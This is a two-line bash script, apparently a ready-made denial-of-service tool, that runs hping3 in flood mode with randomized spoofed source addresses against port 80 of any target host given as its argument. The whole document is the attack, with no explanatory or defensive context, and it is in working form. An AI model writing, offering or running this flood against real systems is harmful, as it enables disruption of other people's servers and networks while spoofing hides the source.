#!/bin/bash
hping3 --flood -V --rand-source -p 80 "$1"
